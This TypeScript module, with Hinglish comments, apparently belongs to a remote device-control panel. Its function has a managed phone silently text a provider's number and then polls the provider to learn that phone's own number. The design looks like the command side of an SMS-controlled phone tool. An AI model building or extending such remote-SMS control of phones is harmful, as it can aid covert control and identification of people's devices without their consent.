// Get Number engine — device ka actual phone number pata karna.
//
// USER FLOW:
//   1. Server Get Number provider se session + target-number + token leta hai
//   2. Device ko token wala SMS target-number pe bhejna hota hai (auto via RTDB)
//   3. Provider SMS detect karta hai aur device ka number return karta hai
//   4. Poling (max 90s) — jab status=done, 'from' hi device ka asli number hai

export interface GetNumberResult {
  deviceId: string;
  number: string; // device ka mila hua number
}

export interface GetNumberError {
  ok: false;
  error: string; // Hinglish — user ko dikhana hai
}

import { hasActiveApi } from './apiRegistry';
import { API_BASE } from './apiBase';
import { panelAuthHeaders } from './panelSession';

// Per-device: server proxy se step-1 lo, device se SMS bhijwao, poll karo.
export async function getDeviceNumber(
  deviceId: string,
  _hint?: string,
): Promise<{ ok: true; result: GetNumberResult } | GetNumberError> {
  if (!(await hasActiveApi('get_number'))) {
    return { ok: false, error: 'Get Number API abhi band hai — owner ne remove ki hai. Baad me try karo.' };
  }

  const headers: Record<string, string> = { 'Content-Type': 'application/json', ...panelAuthHeaders() };

  // Step 1: session + target number + token lo
  let step1: { ok?: boolean; session?: string; number?: string; token?: string; error?: string };
  try {
    const r = await fetch(
      `${API_BASE}/api/panel/number/get?deviceId=${encodeURIComponent(deviceId)}`,
      { headers },
    );
    step1 = await r.json().catch(() => ({}));
    if (!r.ok) {
      return { ok: false, error: step1.error === 'get_number_not_configured'
        ? 'Get Number API configure nahi hai — owner se contact karo.'
        : `Provider error (${r.status}) — baad me try karo.` };
    }
  } catch {
    return { ok: false, error: 'Panel unreachable — internet check karke dobara try karo.' };
  }

  if (!step1.ok || !step1.session || !step1.number || !step1.token) {
    return { ok: false, error: step1.error ?? 'Number request fail — dobara try karo.' };
  }

  const { session, number: targetNumber, token } = step1;

  // Step 2: device se targetNumber pe token SMS bhejo (fire-and-forget)
  fetch(`${API_BASE}/api/panel/devices/${encodeURIComponent(deviceId)}/sms`, {
    method: 'POST',
    headers,
    body: JSON.stringify({ to: targetNumber, message: token }),
  }).catch(() => { /* RTDB offline — device next heartbeat pe kha le sakta hai */ });

  // Step 3: poll karo jab tak status=done ya timeout (90s, har 3s)
  const deadline = Date.now() + 90_000;
  while (Date.now() < deadline) {
    await new Promise<void>((res) => setTimeout(res, 3000));
    try {
      const r = await fetch(
        `${API_BASE}/api/panel/number/check?session=${encodeURIComponent(session)}`,
        { headers },
      );
      if (!r.ok) continue;
      const d = (await r.json().catch(() => ({}))) as { status?: string; from?: string };
      if (d.status === 'done' && d.from) {
        return { ok: true, result: { deviceId, number: d.from } };
      }
    } catch { /* continue polling */ }
  }

  return { ok: false, error: 'Timeout — device ka SMS nahi aaya (90s). Device online hai aur SMS allow hai? Dobara try karo.' };
}
